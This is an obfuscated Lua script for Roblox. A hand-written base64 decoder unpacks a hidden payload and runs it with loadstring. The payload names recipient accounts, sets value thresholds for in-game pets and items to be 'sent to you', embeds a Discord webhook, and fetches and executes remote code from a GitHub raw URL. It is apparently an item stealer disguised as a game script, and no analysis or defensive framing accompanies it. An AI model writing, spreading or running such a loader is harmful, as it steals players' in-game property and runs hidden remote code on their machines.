
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJCZW5ueWJvaWJybzEyMzQsIE5PVEJFTlNBTFRBQ0MiLAogICAgIkJlbm55Ym9pYnJvMTIzNCwgTk9UQkVOU0FMVEFDQyIsCiAgICAiQmVubnlib2licm8xMjM0LCBOT1RCRU5TQUxUQUNDIiwKfQptaW5fcmFwID0gMTAwMDAgLS0gbWluaW11bSByYXAgb2YgZWFjaCBpdGVtIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQptaW5fY2hhbmNlID0gMTAwMCAtLSBtaW5pbXVtIGNoYW5jZSBvZiBwZXRzIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDQ1ODgyMDIzMjkxMTY3MDIvMUlFVElNS2ViNGZpVWw1aDBLSzhkSTVpNUhDSmdhM2ZrQ2IyY3RzeHpIdkJIS2s3QUlHSTd4QVQ5SFZkRncySG8wdXUiCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkFLQWpkZGMvTmV3LVNvdXJjZXMvcmVmcy9oZWFkcy9tYWluL1BldHNHb0J5VHJ1bHlOb3RCZW4udHh0IiwgdHJ1ZSkpKCk7Cg=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))();
